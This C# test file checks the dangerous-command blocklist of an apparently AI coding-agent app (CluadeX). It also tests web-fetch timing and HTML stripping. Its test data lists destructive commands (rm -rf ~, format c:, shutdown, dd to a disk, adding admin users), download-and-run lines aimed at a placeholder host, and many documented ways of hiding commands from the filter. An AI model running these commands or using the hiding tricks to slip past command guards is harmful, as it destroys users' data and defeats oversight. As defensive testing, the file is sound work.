using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Loader;
using System.Text;
using System.Text.RegularExpressions;
using CluadeX.Services;
using Microsoft.Extensions.DependencyInjection;
using D = CluadeX.Services.DangerousCommandCheck.Dialect;

namespace ToolTest;

/// <summary>
/// The blocklist read as the shell reads it (round 4): $( ) and `…` inside "double quotes" run; a pipeline
/// continued over a line break still hands its text to sh; source / . run text; the reading is linear; a
/// PowerShell code block is written so PowerShell 5.1 reads it as UTF-8. web_fetch: one budget for the
/// whole fetch, and a linear HTML stripper. And the differential check against the last committed build.
/// Every "PWNED" proof only ever creates a marker file in a temp folder — nothing destructive reaches a shell.
/// </summary>
internal static partial class Program
{
    static async Task Round4(IServiceProvider provider, SettingsService settings, LocalizationService loc)
    {
        static string F(string c, D d) => DangerousCommandCheck.FindBlocked(c, d);
        static string Q(string s) => s == null ? "(null)" : Trunc(s.Replace("\r", "\\r").Replace("\n", "⏎"), 160);

        // ── PG19: what the shell runs is checked; what it only prints is not ──
        await Case("PG19", async () =>
        {
            foreach (var (id, name, text, d) in new (string, string, string, D)[]
            {
                ("PG19", "bash: $( ) inside \"…\" runs — echo \"cleaning $(rm -rf ./build)\"", "echo \"cleaning $(rm -rf ./build)\"", D.Posix),
                ("PG19b", "bash: a multi-line $( ) with its own quotes inside \"…\" (PWNED-B)", "echo \"$(echo \"x\"\nrm -rf ~\necho \"y\")\"", D.Posix),
                ("PG19c", "bash: `…` inside \"…\"", "echo \"`rm -rf ~`\"", D.Posix),
                ("PG19d", "bash: a heredoc piped to sh over a line break — cat <<EOF | ⏎ … ⏎ EOF ⏎ sh (PWNED-A)", "cat <<EOF |\nrm -rf ~\nEOF\nsh", D.Posix),
                ("PG19e", "bash: a string piped to sh over a line break (PWNED-C)", "echo \"\nrm -rf ~\n\" |\nsh", D.Posix),
                ("PG19f", "bash: … and over a backslash-newline", "echo \"\nrm -rf ~\n\" | \\\nsh", D.Posix),
                ("PG19g", "bash: source /dev/stdin <<EOF (PWNED-G)", "source /dev/stdin <<EOF\nrm -rf ~\nEOF", D.Posix),
                ("PG19h", "bash: . /dev/stdin <<EOF", ". /dev/stdin <<EOF\nrm -rf ~\nEOF", D.Posix),
                ("PG19i", "bash: $(cat <<EOF …) as the command itself runs its output", "$(cat <<EOF\nrm -rf /tmp/x\nEOF\n)", D.Posix),
                ("PG19j", "bash: $(x)#… is no comment — what follows on the line runs", "echo $(true)#; format c:", D.Posix),
                ("PG19k", "bash: the command after `then` / `sudo`", "if true; then rm -rf ~; fi", D.Posix),
                ("PG19l", "PowerShell: $( ) inside \"…\"", "Write-Output \"$(shutdown /s /t 0)\"", D.PowerShell),
                ("PG19m", "PowerShell: a multi-line $( ) with its own quotes inside \"…\" (PWNED-E)", "Write-Output \"$(Write-Output \"x\"\nshutdown /s /t 0\nWrite-Output \"y\")\"", D.PowerShell),
                ("PG19n", "PowerShell: $( ) inside an @\" \"@ here-string", "Write-Output @\"\n$(shutdown /s /t 0)\n\"@", D.PowerShell),
                ("PG19o", "PowerShell: # right after = is a comment in an expression ($x=#'…) — unsure, so read strictly", "$x=#'\nshutdown /s /t 0\n'", D.PowerShell),
                ("PG19p", "PowerShell: a here-string piped to iex over a line break", "@'\nformat c:\n'@ |\niex", D.PowerShell),
                ("PG19q", "PowerShell: … over a backtick-newline", "\"format c:\" `\n| iex", D.PowerShell),
                ("PG19r", "PowerShell 7: … on a line that starts with |", "@'\nformat c:\n'@\n| iex", D.PowerShell),
                ("PG19s", "PowerShell: & \"…\" — a computed command runs its arguments", "& \"powershell\" -Command \"Write-Output hi\nformat c:\"", D.PowerShell),
                ("PG19t", "PowerShell: [scriptblock]::Create(\"…\").Invoke()", "[scriptblock]::Create(\"Write-Output hi\nformat c:\").Invoke()", D.PowerShell),
            })
                Check(id, $"{name} → blocked", F(text, d) != null, $"got={Q(F(text, d))} cmd={Q(text)}");

            // Text → not blocked; the strict (unknown-shell) reading of the very same text does block it, so it
            // is the reading that lets it through.
            foreach (var (id, name, text, d) in new (string, string, string, D)[]
            {
                ("PG19u", "bash: a commit message, then && sh ./post.sh — sh runs a file, not the message", "git commit -m \"fix\n\nformat the totals\" && sh ./post.sh", D.Posix),
                ("PG19v", "bash: … | tee su.txt — su.txt is no su", "cat <<EOF | tee su.txt\nformat x\nEOF", D.Posix),
                ("PG19w", "bash: a comment naming eval after the message", "git commit -m \"fix\n\nformat the totals\" # see eval docs", D.Posix),
                ("PG19x", "bash: Claude Code's commit heredoc inside \"$( … )\", with an odd \" in it", "git commit -m \"$(cat <<'EOF'\nfix: 27\" monitor\n\nformat the totals\nEOF\n)\"", D.Posix),
                ("PG19y", "PowerShell: “typographic quotes” are quotes — PowerShell reads them so (PG21)", "Write-Output “hi\nformat c:\n”", D.PowerShell),
                ("PG19z", "PowerShell: an @\" \"@ here-string with a harmless $( )", "$t = @\"\nTotal: $($n + 1)\nformat the totals\n\"@", D.PowerShell),
            })
            {
                string got = F(text, d), strict = F(text, D.Unknown);
                Check(id, $"{name} → not blocked (strict reading: blocked)", got == null && strict != null, $"got={Q(got)} strict={Q(strict)}");
            }
            foreach (var (id, text, d) in new (string, string, D)[]
            {
                ("PG19za", "git add \"docs/R&D (x).md\" && git commit -m \"docs: R&D (x)\"", D.Posix),
                ("PG19zb", "Copy-Item 'docs/R&D (x).md' 'backup/R&D (x).md'", D.PowerShell),
                ("PG19zc", "copy \"docs\\R&D (x).md\" backup\\", D.Cmd),
            })
                Check(id, $"a path with & and ( ) inside quotes is just a path — {Q(text)} → not blocked", F(text, d) == null, Q(F(text, d)));

            // End to end, harmless: the real shell runs the hidden line (a marker file appears in a temp folder),
            // and the same shape with a listed command is refused.
            string markers = Path.Combine(Path.GetTempPath(), "cx-pwned-" + Guid.NewGuid().ToString("N")[..8]);
            Directory.CreateDirectory(markers);
            bool keep = settings.Settings.Features.DangerousCommandBlocking;
            try
            {
                settings.Settings.Features.DangerousCommandBlocking = true;
                if (ShellRunner.DefaultShell == ShellRunner.Shell.Bash)
                {
                    string M(string name) => Path.Combine(markers, name).Replace('\\', '/');
                    foreach (var (id, label, shape) in new (string, string, Func<string, string>)[]
                    {
                        ("PG19e2", "PWNED-A cat <<EOF |⏎…⏎EOF⏎sh", line => $"cat <<EOF |\n{line}\nEOF\nsh"),
                        ("PG19e3", "PWNED-B echo \"$(…⏎…⏎…)\"", line => $"echo \"$(echo \"x\"\n{line}\necho \"y\")\""),
                        ("PG19e4", "PWNED-C echo \"⏎…⏎\" |⏎sh", line => $"echo \"\n{line}\n\" |\nsh"),
                        ("PG19e5", "echo \"⏎…⏎\" | \\⏎sh", line => $"echo \"\n{line}\n\" | \\\nsh"),
                        ("PG19e6", "PWNED-G source /dev/stdin <<EOF", line => $"source /dev/stdin <<EOF\n{line}\nEOF"),
                    })
                    {
                        string marker = M(id);
                        var run = await T("run_command", ("command", shape($"touch '{marker}'")));
                        string blocked = F(shape("rm -rf ~"), D.Posix);
                        Check(id, $"{label}: Git Bash really runs the hidden line (a marker appears through run_command) — and with `rm -rf ~` there it is blocked",
                            File.Exists(marker) && blocked != null, $"marker={File.Exists(marker)} blocked={Q(blocked)} run={Q(Seen(run))}");
                    }
                    // Owner's rule (374b331): a clean-up delete runs wherever it sits; one aimed at a drive / home / system
                    // folder is put to the red prompt even hidden in a multi-line $( ). Here the answer is No, dry-run is
                    // on, and the target is a drive that does not exist.
                    var cleanup = await T("run_command", ("command", "echo \"$(echo x\nrm -rf ./cx-harness-nothing-here\necho y)\""));
                    Check("PG19e7", "run_command runs a clean-up `rm -rf ./…` hidden in a multi-line $( ) inside \"…\"",
                        cleanup.Success && !Seen(cleanup).Contains("blocked for safety") && !Seen(cleanup).Contains("CluadeX safety"), Seen(cleanup));
                    char noDrive = Enumerable.Range(0, 10).Select(i => (char)('z' - i)).FirstOrDefault(c => !Directory.Exists(char.ToUpperInvariant(c) + ":\\"), 'z');
                    var asks = new List<CluadeX.Services.Safety.DangerRequest>();
                    var keepHandler = CluadeX.Services.Safety.DangerApproval.Handler;
                    bool keepDry = CluadeX.Services.Safety.ProcessLaunchPolicy.DryRun;
                    CluadeX.Services.Safety.DangerApproval.Handler = req => { lock (asks) asks.Add(req); return Task.FromResult(false); };
                    CluadeX.Services.Safety.ProcessLaunchPolicy.DryRun = true;
                    try
                    {
                        var hidden = await T("run_command", ("command", "echo \"$(echo x\n" + "rm" + " -rf /" + noDrive + "/\necho y)\""));
                        Check("PG19e8", "…the same $( ) shape aimed at a drive root asks on the red prompt and, on No, is refused",
                            !hidden.Success && Seen(hidden).Contains("did not approve") && asks.Count == 1, $"asks={asks.Count} {Seen(hidden)}");
                    }
                    finally
                    {
                        CluadeX.Services.Safety.DangerApproval.Handler = keepHandler;
                        CluadeX.Services.Safety.ProcessLaunchPolicy.DryRun = keepDry;
                    }
                }
                else GapIf("PG19e2", "Git Bash end-to-end proofs (Git Bash not found)", false);

                string W(string name) => Path.Combine(markers, name);
                string psMarker = W("pwned-e");
                var ps = await T("powershell", ("command", $"Write-Output \"$(Write-Output \"x\"\nNew-Item -ItemType File -Path '{psMarker}' | Out-Null\nWrite-Output \"y\")\""));
                string psBlocked = F("Write-Output \"$(Write-Output \"x\"\nshutdown /s /t 0\nWrite-Output \"y\")\"", D.PowerShell);
                Check("PG19e8", "PWNED-E: PowerShell really runs the line hidden in \"$( ⏎…⏎ )\" (a marker appears through the powershell tool) — and with shutdown there it is blocked",
                    File.Exists(psMarker) && psBlocked != null, $"marker={File.Exists(psMarker)} blocked={Q(psBlocked)} run={Q(Seen(ps))}");
                string acl = W("acl.txt");
                File.WriteAllText(acl, "x");
                var psRefused = await T("powershell", ("command", $"Write-Output \"$(Write-Output x\nicacls '{acl}'\nWrite-Output y)\""));
                Check("PG19e9", "the powershell tool refuses `icacls` hidden in a multi-line $( ) inside \"…\"",
                    !psRefused.Success && Seen(psRefused).Contains("blocked for safety"), Seen(psRefused));
            }
            finally
            {
                settings.Settings.Features.DangerousCommandBlocking = keep;
                ForceDelete(markers);
            }
        });

        // ── PG20: the reading is linear — one pass per command, whatever its shape ──
        await Case("PG20", async () =>
        {
            // The reviewer's shapes: one line of 32,000 quoted arguments (~400 KB) took ~50 s in round 3.
            string psLine = "$a = @(" + string.Join(",", Enumerable.Range(0, 32000).Select(i => $"'item{i:D6}'")) + ")";
            string shLine = "printf '%s\\n' " + string.Join(" ", Enumerable.Range(0, 32000).Select(i => $"\"item{i:D6}\""));
            var hostile = new (string Name, string Text, D Dialect)[]
            {
                ("PowerShell 32k quoted items", psLine, D.PowerShell),
                ("bash 32k quoted items", shLine, D.Posix),
                ("strict 32k quoted items", shLine, D.Unknown),
                ("bash 16k `bash -c \"…\"` segments", string.Join(" ; ", Enumerable.Range(0, 16000).Select(i => $"bash -c \"x{i}\"")), D.Posix),
                ("bash 40k nested bash -c \"$(", string.Concat(Enumerable.Repeat("bash -c \"$(", 40000)) + string.Concat(Enumerable.Repeat(")\"", 40000)), D.Posix),
                ("PowerShell 50k nested iex \"$(", string.Concat(Enumerable.Repeat("iex \"$(", 50000)) + string.Concat(Enumerable.Repeat(")\"", 50000)), D.PowerShell),
                ("PowerShell 200k a#", string.Concat(Enumerable.Repeat("a#", 200000)), D.PowerShell),
                ("PowerShell 130k @'x", string.Concat(Enumerable.Repeat("@'x", 130000)), D.PowerShell),
                ("PowerShell 400k {", new string('{', 400000), D.PowerShell),
                ("bash 200k $(", string.Concat(Enumerable.Repeat("$(", 200000)), D.Posix),
                ("bash 100k <<A", "cat " + string.Concat(Enumerable.Repeat("<<A ", 100000)), D.Posix),
                ("bash 80k then", string.Concat(Enumerable.Repeat("then ", 80000)), D.Posix),
                ("cmd 400k ;", new string(';', 400000), D.Cmd),
            };
            var slow = new List<string>();
            long worst = 0;
            foreach (var (name, text, d) in hostile)
            {
                F("warm up", d);
                var sw = Stopwatch.StartNew();
                F(text, d);
                sw.Stop();
                worst = Math.Max(worst, sw.ElapsedMilliseconds);
                if (sw.ElapsedMilliseconds >= 1000) slow.Add($"{name} ({text.Length / 1024} KB): {sw.ElapsedMilliseconds} ms");
            }
            var sw1 = Stopwatch.StartNew(); F(psLine, D.PowerShell); long psMs = sw1.ElapsedMilliseconds;
            sw1.Restart(); F(shLine, D.Posix); long shMs = sw1.ElapsedMilliseconds;
            Check("PG20", $"a {psLine.Length / 1024} KB line of 32,000 quoted items finishes in < 1 s — PowerShell {psMs} ms, bash {shMs} ms (round 3: ~50 s)",
                psMs < 1000 && shMs < 1000, $"ps={psMs} sh={shMs}");
            Check("PG20b", $"every hostile 300–500 KB shape (nesting, # runs, here-string openers, heredoc operators, separators) finishes in < 1 s — worst {worst} ms",
                slow.Count == 0, string.Join("; ", slow));
            await Task.CompletedTask;
        });

        // ── PG21: a PowerShell code block is read by PowerShell 5.1 as UTF-8 ──
        await Case("PG21", async () =>
        {
            var exec = provider.GetRequiredService<CodeExecutionService>();
            string dir = Path.Combine(Path.GetTempPath(), "cx-ps1-" + Guid.NewGuid().ToString("N")[..8]);
            Directory.CreateDirectory(dir);
            try
            {
                string Script(string marker) => $"Write-Output \u201chi\nNew-Item -ItemType File -Path '{marker}' | Out-Null\n\u201d";
                // Control: written the old way (UTF-8, no BOM), PowerShell 5.1 reads it in the ANSI code page — the
                // “quotes” are no quotes and the middle line RUNS.
                string oldMarker = Path.Combine(dir, "old-way"), oldFile = Path.Combine(dir, "old.ps1");
                File.WriteAllText(oldFile, Script(oldMarker), new UTF8Encoding(false));
                RunPs51(oldFile);
                bool oldRan = File.Exists(oldMarker);
                // The fix, through the real code-block runner: the same script — the middle line is text.
                string newMarker = Path.Combine(dir, "new-way");
                var r = await exec.ExecuteAsync(Script(newMarker), "powershell");
                bool newRan = File.Exists(newMarker);
                Check("PG21", "a powershell block with a line inside “typographic quotes”: PowerShell 5.1 runs it when the .ps1 has no BOM (control) — the runner writes a BOM and it stays text, as the blocklist reads it",
                    oldRan && !newRan && r.Success && (r.Output ?? "").Contains("New-Item") && F(Script("x"), D.PowerShell) == null,
                    $"oldRan={oldRan} newRan={newRan} success={r.Success} out={Q(r.Output)} err={Q(r.Error)}");

                string thai = "$s = '\u0e2a\u0e27\u0e31\u0e2a\u0e14\u0e35'\nWrite-Output \"len=$($s.Length)\"";
                string thaiFile = Path.Combine(dir, "thai.ps1");
                File.WriteAllText(thaiFile, thai, new UTF8Encoding(false));
                string oldThai = RunPs51(thaiFile);
                var t = await exec.ExecuteAsync(thai, "powershell");
                Check("PG21b", "…and Thai text in it is read as Thai: 'สวัสดี'.Length is 6 (control, no BOM: 18 — mojibake)",
                    (t.Output ?? "").Contains("len=6") && oldThai.Contains("len=18"), $"new={Q(t.Output)} old={Q(oldThai)}");
                var bat = await exec.ExecuteAsync("echo cx-bat-ok", "batch");
                Check("PG21c", "a batch block still runs (no BOM there: cmd would run it as part of the first command)",
                    bat.Success && (bat.Output ?? "").Contains("cx-bat-ok") && !(bat.Output ?? "").Contains("\u00ef\u00bb\u00bf"), Q(bat.FullOutput));
            }
            finally { ForceDelete(dir); }
        });

        // ── PG22: the HTML stripper is linear and gives the same text as the regexes did ──
        await Case("PG22", async () =>
        {
            var strip = typeof(WebFetchService).GetMethod("StripHtml", BindingFlags.NonPublic | BindingFlags.Static);
            if (strip == null) { Check("PG22", "WebFetchService.StripHtml exists", false); return; }
            string New(string html) => (string)strip.Invoke(null, new object[] { html });

            // The same text as before: a real-looking page, edge cases, and 3,000 random tag soups.
            var corpus = new List<string>
            {
                "<!doctype html><html><head><title>T &amp; C</title><style media=\"x\">p{color:red}</style>"
                + "<script src=\"a.js\"></script><SCRIPT type=text/javascript>if (a<b && c>d) { x = '</div>'; }</SCRIPT></head>"
                + "<body><h1 class=\"t\">Hello&nbsp;world</h1>\n<p>One <b>two</b>\t three &lt;four&gt;</p><!-- c --><br/>"
                + "<a href=\"/x?a=1&amp;b=2\">link</a><style>.a{}</STYLE>tail</body></html>",
                "<>", "< a", "a < b > c", "<script>", "</script>", "<script>x", "<scriptx>y</scriptx>z", "<styles>q</style>r",
                "<style\n>s</style\n>t", "<SCRIPT>a</script>b", "<script></style></script>c", "&amp;lt;", "",
            };
            var rng = new Random(4242);
            string[] parts = ["<script>", "</script>", "<style a=1>", "</STYLE>", "<", ">", "<>", "a", " ", "&amp;", "\n", "<b>", "</b", "<SCRIPT x>", "</scrip>", "<styles>", "\t", "é"];
            for (int k = 0; k < 3000; k++)
                corpus.Add(string.Concat(Enumerable.Range(0, rng.Next(1, 30)).Select(_ => parts[rng.Next(parts.Length)])));
            var differ = corpus.Where(h => New(h) != OldStripHtml(h)).Take(3).ToList();
            Check("PG22", $"the linear stripper gives the regexes' text on {corpus.Count} pages (a real-looking one, edge cases, random tag soups)",
                differ.Count == 0, string.Join(" | ", differ.Select(h => $"[{Q(h)}] new=[{Q(New(h))}] old=[{Q(OldStripHtml(h))}]")));

            // Control: the old regexes on 64 KB of a hostile shape already take seconds (reviewer: 2.3 s; 256 KB: 39 s).
            string hostile64 = string.Concat(Enumerable.Repeat("<script></style>", 64 * 1024 / 16));
            var sw = Stopwatch.StartNew();
            OldStripHtml(hostile64);
            long oldMs = sw.ElapsedMilliseconds;
            var times = new List<string>();
            long worst = 0;
            foreach (var (name, html) in new (string, string)[]
            {
                ("<script></style>", string.Concat(Enumerable.Repeat("<script></style>", WebFetchService.MaxBodyBytes / 16))),
                ("<", new string('<', WebFetchService.MaxBodyBytes)),
                ("<script>", string.Concat(Enumerable.Repeat("<script>", WebFetchService.MaxBodyBytes / 8))),
                ("<a ", string.Concat(Enumerable.Repeat("<a ", WebFetchService.MaxBodyBytes / 3))),
                ("<style></script>", string.Concat(Enumerable.Repeat("<style></script>", WebFetchService.MaxBodyBytes / 16))),
            })
            {
                sw.Restart();
                New(html);
                worst = Math.Max(worst, sw.ElapsedMilliseconds);
                times.Add($"{name}: {sw.ElapsedMilliseconds} ms");
            }
            Check("PG22b", $"2 MB (the body cap) of hostile markup strips in < 1 s each — worst {worst} ms (control: the old regexes took {oldMs} ms on just 64 KB)",
                worst < 1000 && oldMs >= 500, string.Join("; ", times));
            await Task.CompletedTask;
        });

        // ── PG23: one budget for the whole fetch, every redirect hop included ──
        await Case("PG23", async () =>
        {
            using var mock = new RedirectMock();
            string A(string path) => $"http://127.0.0.1:{mock.Port}{path}";

            // Control: the slow chain itself works — 5 hops of 0.7 s, each far under a 2 s budget.
            var roomy = new WebFetchService { FetchTimeout = TimeSpan.FromSeconds(15) };
            var sw = Stopwatch.StartNew();
            var ok = await roomy.FetchAsync(A("/slow/0"));
            long okMs = sw.ElapsedMilliseconds;
            Check("PG23", $"mock proven: /slow/0 → … → /slow/4 is 5 hops of {RedirectMock.SlowHopMs} ms and ends in SLOW-FINAL (with room: Ok after {okMs} ms)",
                ok.Outcome == WebFetchOutcome.Ok && ok.Content == "SLOW-FINAL" && okMs >= 5 * RedirectMock.SlowHopMs - 200, $"{ok.Outcome} [{ok.Content}] {okMs} ms");

            // The fix: a 2 s budget covers all of it — a budget per hop (round 3) would have let every hop through.
            var tight = new WebFetchService { FetchTimeout = TimeSpan.FromSeconds(2) };
            sw.Restart();
            var timed = await tight.FetchAsync(A("/slow/0"));
            long tMs = sw.ElapsedMilliseconds;
            Check("PG23b", $"…with a 2 s budget the chain is TimedOut at ~2 s ({tMs} ms) although no single hop takes more than {RedirectMock.SlowHopMs} ms",
                timed.Outcome == WebFetchOutcome.TimedOut && tMs >= 1800 && tMs < 3300, $"{timed.Outcome} {tMs} ms url={timed.Url}");

            // The redirect prompt is not the site's time: a 2.5 s prompt under a 1 s budget is still followed.
            var quick = new WebFetchService { FetchTimeout = TimeSpan.FromSeconds(1) };
            var prompted = await quick.FetchAsync(A("/same"), async (f, t) => { await Task.Delay(2500); return true; });
            Check("PG23c", "the redirect permission prompt does not count: a 2.5 s prompt under a 1 s budget → still followed, Ok",
                prompted.Outcome == WebFetchOutcome.Ok && prompted.Content.Contains("FINAL-SAME-HOST"), $"{prompted.Outcome} [{prompted.Content}]");

            // A user's cancel is still a cancel, not a timeout — also in the middle of a body.
            var patient = new WebFetchService { FetchTimeout = TimeSpan.FromSeconds(20) };
            using var cts = new CancellationTokenSource(TimeSpan.FromMilliseconds(1200));
            string outcome;
            sw.Restart();
            try { var p = await patient.FetchAsync(A("/trickle"), null, cts.Token); outcome = "returned " + p.Outcome; }
            catch (OperationCanceledException) { outcome = "cancelled"; }
            Check("PG23d", "cancelling mid-body still cancels (OperationCanceledException), within the moment, not at the budget",
                outcome == "cancelled" && sw.ElapsedMilliseconds < 5000, $"{outcome} after {sw.ElapsedMilliseconds} ms");
        });

        // ── DIFF: no input the last committed build refused is let through now ──
        await Case("DIFF", async () =>
        {
            string baseDir = Environment.GetEnvironmentVariable("CLUADEX_BASELINE_BIN")
                ?? typeof(Program).Assembly.GetCustomAttributes<AssemblyMetadataAttribute>().FirstOrDefault(a => a.Key == "CluadeXBaselineBin")?.Value;
            if (string.IsNullOrWhiteSpace(baseDir) || !File.Exists(Path.Combine(baseDir, "CluadeX.dll")))
            {
                GapIf("DIFF", "differential vs the baseline build: not run — pass -p:CluadeXBaselineBin=<baseline bld>\\ (or CLUADEX_BASELINE_BIN)", false, baseDir ?? "(none)");
                return;
            }
            var baseline = new BaselineContext(baseDir).LoadFromAssemblyName(new AssemblyName("CluadeX"));
            var ats = baseline.GetType("CluadeX.Services.AgentToolService", throwOnError: true)!;
            var baseCheck = ats.GetMethod("CheckDangerousCommand", BindingFlags.NonPublic | BindingFlags.Instance, [typeof(string)]);
            bool isOld = baseline.Location.StartsWith(Path.GetFullPath(baseDir), StringComparison.OrdinalIgnoreCase)
                         && baseline.GetType("CluadeX.Services.DangerousCommandCheck") == null && baseCheck != null;
            // Only the check runs: an AgentToolService with nothing in it but settings whose blocking is on.
            var settingsType = baseline.GetType("CluadeX.Services.SettingsService", throwOnError: true)!;
            object baseSettings = RuntimeHelpers.GetUninitializedObject(settingsType);
            object appSettings = Activator.CreateInstance(baseline.GetType("CluadeX.Models.AppSettings", throwOnError: true)!)!;
            settingsType.GetField("_settings", BindingFlags.NonPublic | BindingFlags.Instance)!.SetValue(baseSettings, appSettings);
            object baseSvc = RuntimeHelpers.GetUninitializedObject(ats);
            ats.GetField("_settingsService", BindingFlags.NonPublic | BindingFlags.Instance)!.SetValue(baseSvc, baseSettings);
            bool BaseBlocks(string c) => baseCheck!.Invoke(baseSvc, new object[] { c }) != null;

            // The new build through its real entry point — the tools' check, per dialect (the code-block and verify
            // paths call the same FindBlocked with these dialects).
            var newCheck = typeof(AgentToolService).GetMethod("CheckDangerousCommand", BindingFlags.NonPublic | BindingFlags.Instance)!;
            bool keep = settings.Settings.Features.DangerousCommandBlocking;
            settings.Settings.Features.DangerousCommandBlocking = true;
            try
            {
                bool NewBlocks(string c, D d) => newCheck.Invoke(Svc, new object[] { c, d }) != null;
                var dialects = new[] { D.Posix, D.PowerShell, D.Cmd, D.Unknown };
                string victim = Path.Combine(Path.GetTempPath(), "cluadex-victim.txt");

                // Dangerous inputs: every PWNED case, the harness's blocked cases, and the original list's own shapes
                // — casing, leading whitespace, Unicode the original lower-casing / culture comparison folded.
                var dangerous = new List<string>
                {
                    // PWNED cases (round 3 review) and their variants
                    "echo \"cleaning $(rm -rf ./build)\"", "echo \"$(echo \"x\"\nrm -rf ~\necho \"y\")\"", "echo \"`rm -rf ~`\"",
                    "cat <<EOF |\nrm -rf ~\nEOF\nsh", "echo \"\nrm -rf ~\n\" |\nsh", "echo \"\nrm -rf ~\n\" | \\\nsh",
                    "source /dev/stdin <<EOF\nrm -rf ~\nEOF", ". /dev/stdin <<EOF\nrm -rf ~\nEOF",
                    "Write-Output \"$(shutdown /s /t 0)\"", "Write-Output \"$(Write-Output \"x\"\nshutdown /s /t 0\nWrite-Output \"y\")\"",
                    "Write-Output @\"\n$(shutdown /s /t 0)\n\"@", "Write-Output \u201chi\nshutdown /s /t 0\n\u201d", "$x=#'\nshutdown /s /t 0\n'",
                    "& {\nshutdown /s /t 0\n}", "if true; then rm -rf ~; fi", "(rm -rf ~)", "cat <<'EOF' > x.sh\nrm -rf ~\nEOF\nbash x.sh",
                    // the harness's blocked cases (PG13, PG17)
                    $"del /q \"{victim}\"", $"echo harmless\r\ndel /q \"{victim}\"", $"Write-Output hi\nRemove-Item -Recurse -Force '{victim}'",
                    "rm -rf ./cluadex-harness-nothing-here", "echo hi\nrm -rf ./cluadex-harness-nothing-here", $"echo Don't\r\ndel /q \"{victim}\"\r\necho won't",
                    "echo hi\nformat c:", "git commit -m \"fix\n\nmsg\"\nformat c:", "cat <<EOF > notes.txt\nformat later\nEOF\nformat c:",
                    "# don't touch\nformat c:", "echo don\\'t\nformat c:", "echo \"oops\nformat c:", "echo $((1<<2))\nformat c:",
                    "cat <<< \"x\"\nformat c:", "echo $'it\\'s'\nformat c:", "echo \"a\"; format c:", "x=$(format c:)", "echo ok\n{ format c:; }",
                    "@'\nx\n'@ | Out-File a.txt\nformat c:", "# it's fine\n<# don't #>\nformat c:", "Write-Output 'a'; format c:",
                    "echo Don't\nformat c:\necho won't", "echo \"a\nformat c:", "bash -c \"echo x | rm -rf /\"", "bash <<EOF\nrm -rf ~\nEOF",
                    "cat <<'EOF' | sh\necho hi\nformat c:\nEOF", "bash -c \"echo hi\nformat c:\"", "echo \"echo hi\nrm -rf ~\" | bash",
                    "bash -c \"format c:\"", "Invoke-Expression @'\nformat c:\n'@", "@'\nWrite-Output hi\nformat c:\n'@ | iex",
                    "powershell -Command \"Write-Output hi\nformat c:\"", "echo x && format c:",
                    // the original list's own shapes: every prefix and every "contains" pattern
                    "rm -rf /", "rm -rf ~/x", "rm -rf .git", "format c:", "format\tc:", "del /s x", "del /f x", "del /q x", "rmdir /s x", "rd /s x",
                    "shutdown /s /t 0", "Restart-Computer", "Stop-Computer -Force", "reg delete HKCU\\x /f", "reg add HKCU\\x /v y", "net user x y /add",
                    "net localgroup administrators x /add", "takeown /f x", "icacls x /grant y:F", "mkfs.ext4 /dev/sda1", "dd if=/dev/zero of=/dev/sda",
                    "> /dev/sda", ">/dev/sda", "ls | rm -rf x", "dir | del x", "true && rm -rf x", "cd x && del y", "cd x; rm -rf y", "cd x; del y",
                    "Write-Output x` rm y", "x ` del y", "Invoke-WebRequest https://x.example/a.ps1", "Invoke-RestMethod https://x.example",
                    "Start-BitsTransfer -Source https://x.example", "certutil -urlcache -f https://x.example/a a.exe", "bitsadmin /transfer j https://x.example a.exe",
                    "Get-Item x | Remove-Item -Recurse", "Remove-Item -Force x", "Remove-Item x -Recurse -Force", "Format-Volume -DriveLetter D",
                    "Clear-Disk -Number 1", "Format-Disk 1",
                    // casing, whitespace, Unicode
                    "FORMAT C:", "  \t Shutdown -h now", "\r\n\r\nformat c:", "\u00a0\u3000format c:", "\v\fshutdown", "ta\u212Aeown /f x",
                    "\u0130nvoke-WebRequest https://x.example", "\u200Brm -rf /", "r\u00ADm -rf /", "\u200Bformat c:", "s\u0000hutdown",
                    "echo x\n\u00a0format c:", "echo x;\u2003format c:",
                };
                var benign = new (string Text, D Dialect)[]
                {
                    ("git commit -m \"fix totals\n\nformat the totals as currency\"", D.Posix),
                    ("git commit -m \"$(cat <<'EOF'\nfix: x\n\nformat the totals as currency\nEOF\n)\"", D.Posix),
                    ("python - <<'EOF'\nformat = \"{:,.2f}\"\nprint(format.format(1234.5))\nEOF", D.Posix),
                    ("cat <<EOF > a.txt\nformat later\nEOF", D.Posix),
                    ("echo \"a; format c: is a bad idea\"", D.Posix),
                    ("cat <<EOF | tee su.txt\nformat x\nEOF", D.Posix),
                    ("git commit -m \"fix\n\nformat the totals\" # see eval docs", D.Posix),
                    ("git commit -m \"fix\n\nformat the totals\" && sh ./post.sh", D.Posix),
                    ("$notes = @'\nformat the totals as currency\n'@\nSet-Content notes.txt $notes", D.PowerShell),
                    ("git commit -m @'\nfix\n\nformat the totals\n'@", D.PowerShell),
                    ("Write-Output 'line one\nformat line two'", D.PowerShell),
                    ("git add \"docs/R&D (x).md\" && git commit -m \"docs: R&D (x)\"", D.Posix),
                    ("Copy-Item 'docs/R&D (x).md' 'backup/R&D (x).md'", D.PowerShell),
                    ("copy \"docs\\R&D (x).md\" backup\\", D.Cmd),
                    ("dotnet build -clp:ErrorsOnly --nologo", D.Cmd),
                };

                int baseBlocked = dangerous.Count(BaseBlocks), baseBenignBlocked = benign.Count(b => BaseBlocks(b.Text));
                int newOnly = dangerous.Count(c => !BaseBlocks(c) && dialects.All(d => NewBlocks(c, d)));
                Check("DIFF", $"baseline loaded from {baseDir}: aa8726c's own check (no DangerousCommandCheck type; CheckDangerousCommand(string)) — it refuses {baseBlocked} of {dangerous.Count} dangerous inputs (so the comparison is not empty)",
                    isOld && baseBlocked >= 40, $"isOld={isOld} location={baseline.Location}");
                int n = 0;
                foreach (var c in dangerous)
                {
                    n++;
                    if (!BaseBlocks(c)) continue;
                    var allowed = dialects.Where(d => !NewBlocks(c, d)).ToList();
                    Check($"DIFF{n:D2}", $"baseline blocks [{Q(c)}] → the new build blocks it too, in every dialect", allowed.Count == 0,
                        "FAIL: baseline blocks and new allows in " + string.Join(", ", allowed));
                }
                var benignBlocked = benign.Where(b => NewBlocks(b.Text, b.Dialect)).Select(b => $"[{b.Dialect}] {Q(b.Text)}").ToList();
                Check("DIFFb", $"the {benign.Length} benign inputs the new reading lets through on purpose (commit messages with a 'format …' line, heredocs, here-strings, R&D (x).md paths) stay allowed — and the baseline allowed {benign.Length - baseBenignBlocked} of them too",
                    benignBlocked.Count == 0 && baseBenignBlocked == 0, string.Join(" | ", benignBlocked));
                // Not a check — the other direction, for the record: what the baseline let through and the new build
